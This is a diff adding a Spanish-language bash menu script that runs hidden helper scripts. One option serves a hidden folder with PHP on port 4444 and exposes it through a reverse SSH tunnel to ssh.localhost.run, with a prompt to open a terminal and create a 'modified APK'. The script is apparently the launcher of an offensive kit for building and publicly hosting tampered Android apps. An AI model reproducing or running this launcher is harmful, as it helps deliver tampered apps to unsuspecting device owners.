@@ -1,0 +1,21 @@
+bash .banner
+echo "Introduce la opcion que ocuparas:"
+echo ""
+echo "1)Servidor Online (Hosteado Por ti en una web alterna)"
+echo "2)Servidor Local (Hosteado en tu Teleofno para uso Online y Local)"
+echo ""
+read num
+
+# Zona if
+
+if [ "$num" = "1" ]; then
+bash .cr
+fi
+
+if [ "$num" = "2" ]; then
+bash .banner
+echo "Copia el enlace de abajo y abre una nueva terminal para crear un"
+echo "Apk modificado!!"
+echo ""
+php -S localhost:4444 -t .st | ssh -R 80:localhost:4444 ssh.localhost.run
+fi
